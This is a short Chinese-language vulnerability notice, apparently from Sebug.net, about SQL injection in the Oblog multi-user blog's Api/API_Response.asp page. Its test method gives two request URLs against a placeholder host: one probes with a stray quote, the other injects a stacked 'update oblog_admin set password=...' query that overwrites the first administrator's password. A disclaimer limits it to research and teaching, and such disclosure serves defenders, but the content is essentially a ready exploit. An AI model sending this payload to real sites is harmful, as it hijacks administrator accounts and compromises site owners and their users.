@@ -1,0 +1,6 @@
+Oblog多用户博客程序Api/API_Response.asp页面过滤不严导致SQL注入漏洞
+
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.首先提交http://www.XXXXXXX.com/oblog45/api/API_Response.asp?syskey=8092826db0ab2902&username=hackhua&savecookie=0&password=1'2. 3.提交http://www.XXXXXXX.com/oblog45/api/API_Response.asp?syskey=8092826db0ab2902&username=hackhua&savecookie=0&password=1';update oblog_admin set password='7cc9bfe9291ac66b' where id=1--4. 
